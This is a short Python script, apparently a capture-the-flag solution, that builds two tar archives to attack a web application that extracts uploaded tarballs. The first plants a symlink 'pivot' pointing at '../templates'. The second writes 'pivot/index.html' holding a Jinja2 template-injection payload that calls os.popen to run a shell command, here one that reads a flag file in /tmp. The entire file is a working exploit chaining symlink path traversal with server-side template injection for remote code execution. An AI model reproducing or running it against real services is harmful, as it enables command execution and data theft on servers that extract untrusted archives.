import tarfile
import io

def build_symlink_tar(filepath: str) -> None:
    with tarfile.open(filepath, mode="w") as tar:
        link = tarfile.TarInfo("pivot")
        link.type = tarfile.SYMTYPE
        link.linkname = "../templates"
        tar.addfile(link)

def build_payload_tar(filepath: str, command: str) -> None:
    payload = "{{ cycler.__init__.__globals__.os.popen(%r).read() }}" % command
    data = payload.encode("utf-8")

    with tarfile.open(filepath, mode="w") as tar:
        tpl = tarfile.TarInfo("pivot/index.html")
        tpl.size = len(data)
        tar.addfile(tpl, io.BytesIO(data))

build_symlink_tar("link_templates.tar")
#build_payload_tar("payload_ls_tmp.tar", "ls -la /tmp")
build_payload_tar("payload_ls_tmp.tar", "cat /tmp/therealflag_c0ef1956e7df629d80adff08ef491a1a")
